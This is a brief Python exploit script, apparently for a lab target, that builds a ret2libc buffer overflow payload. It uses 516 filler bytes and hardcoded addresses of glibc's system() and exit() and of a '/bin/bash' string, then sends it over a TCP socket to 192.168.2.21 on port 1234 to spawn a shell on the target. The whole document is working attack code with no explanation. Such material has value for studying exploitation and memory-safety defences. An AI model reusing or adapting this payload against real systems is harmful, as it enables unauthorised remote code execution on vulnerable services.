#!/bin/env python3
import socket

filler = 'A' * 516
eip = '\x40\x10\xe2\xb7' # address of system@glibc - 0xb7e21040
exiter = '\x90\x39\xe1\xb7' # address of exit@glibc - 0xb7e13990
shell = '\x26\xfe\xff\xbf' # address of "/bin/bash" - 0xbffffe26
garb2 = 'EEEE'

buffer = filler + eip + exiter + shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.2.21", 1234))
s.send(bytes(buffer, encoding='latin-1'))

s.close
